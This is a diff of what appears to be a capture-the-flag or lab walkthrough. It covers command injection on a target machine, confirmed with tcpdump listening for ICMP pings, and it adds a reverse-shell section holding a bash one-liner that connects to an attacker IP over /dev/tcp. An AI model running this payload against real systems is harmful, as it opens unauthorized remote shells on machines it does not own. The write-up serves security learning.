@@ -248,14 +248,21 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 182.51 seconds
 ```
 
+---
+
 ## Command Injection
 ![image](https://user-images.githubusercontent.com/83878909/229377856-48d35bf2-5c99-4f8b-9811-196ea2764034.png)
 
 ### Injection
 - Start `tcpdump`.
 ```CSS
-▶ 
+▶ tcpdump -i tun0 icmp
 ```
 ![image](https://user-images.githubusercontent.com/83878909/229378297-d997f95c-1306-4613-8c4d-a59272cf39e0.png)
+
 - ICMP echo request received from target machine.
 ![image](https://user-images.githubusercontent.com/83878909/229378335-153e312c-3b94-4d2c-a95a-43ad5601828e.png)
+
+### Reverse Shell
+Reverse Shell Payload: `bash -c'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'`
+
